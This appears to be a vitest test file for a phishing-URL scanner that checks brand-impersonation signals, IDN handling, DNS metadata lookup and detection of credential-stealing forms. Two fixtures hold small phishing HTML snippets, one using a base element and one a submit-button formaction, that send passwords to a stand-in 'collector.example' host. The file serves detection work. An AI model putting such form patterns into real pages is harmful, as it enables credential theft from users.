import { describe, expect, it, vi } from "vitest";
import { analyzeUrl } from "@/lib/services/url/analyze";
import { inspectPageFixture } from "@/lib/services/url/controlled-scan";
import { lookupDns } from "@/lib/services/url/dns.server";

describe("Phase 1B resumed general protections", () => {
  it.each(["https://du.ae/login", "https://menu.ae/account", "https://venue.ae/login", "https://dunepay.example/offers"])("requires whole DNS labels for official-brand evidence: %s", url => {
    expect(analyzeUrl(url).signals.some(s => s.code === "brand_impersonation")).toBe(false);
  });
  it("still detects a full official domain in misleading DNS labels", () => {
    expect(analyzeUrl("https://secure.u.ae.attacker.example/login").classification).toBe("suspicious");
  });
  it.each(["https://mohre-refund.example/account", "https://uaepass-reward.example/claim"])("recognizes financial-return brand lures %s", url => {
    expect(analyzeUrl(url).classification).toBe("suspicious");
  });
  it.each(["https://xn--.com/", "https://xn--abc-.com/"])("rejects undecodable IDNs without network eligibility %s", url => {
    expect(analyzeUrl(url).networkEligible).toBe(false);
  });
  it("recognizes base-element credential exfiltration", () => {
    expect(inspectPageFixture("https://adcb.com/login", '<base href="https://collector.example/"><form action="/capture"><input type="password"></form>').externalCredentialForm).toBe(true);
  });
  it("recognizes submit-button override credential exfiltration", () => {
    expect(inspectPageFixture("https://adcb.com/login", '<form action="/auth"><input type="password"><button formaction="https://collector.example/">Submit</button></form>').externalCredentialForm).toBe(true);
  });
  it("does not mistake short brand substrings in unrelated titles", () => {
    expect(inspectPageFixture("https://school.example/login", '<title>Education account</title><form><input type="password"></form>').titleMismatch).toBe(false);
  });
  it("returns actual NS/MX/CAA metadata without treating it as trust", async () => {
    const request = vi.fn<typeof fetch>().mockImplementation(async () => new Response(JSON.stringify({ Status: 0, Answer: [{ name: "du.ae.", type: 15, data: "10 mail.du.ae." }, { name: "du.ae.", type: 2, data: "ns.du.ae." }, { name: "du.ae.", type: 257, data: '0 issue "example-ca.com"' }] }), { headers: { "Content-Type": "application/json" } }));
    const result = await lookupDns("du.ae", request);
    expect(result).toMatchObject({ status: "available", network: null, addresses: [] });
    if (result.status !== "available") throw new Error("DNS metadata absent");
    expect(result.records).toHaveLength(3);
    expect(request).toHaveBeenCalledTimes(5);
  });
});